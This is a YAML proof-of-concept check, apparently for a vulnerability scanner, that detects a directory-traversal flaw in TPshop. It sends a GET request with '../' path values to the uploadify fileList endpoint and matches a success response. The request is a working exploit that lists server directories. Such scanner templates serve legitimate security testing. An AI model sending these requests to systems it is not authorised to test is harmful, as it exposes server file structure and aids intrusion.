detail:
  author: "\u6E05\u98CE\u660E\u6708(www.secbook.info)"
  exploit:
  - https://localhost/index.php/Home/uploadify/fileList?type=.+&path=../../
  influence_version: TPshop
  links:
  - https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
  - http://www.tp-shop.cn
expression: r0()
manual: true
name: poc-yaml-tpshop-directory-traversal
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string("\"state\":\"SUCCESS\"")))
      && response.body.bcontains(bytes(string("total")))
    request:
      cache: true
      follow_redirects: false
      headers:
        Accept-Encoding: deflate
      method: GET
      path: /index.php/Home/uploadify/fileList?type=.+&path=../
transport: http
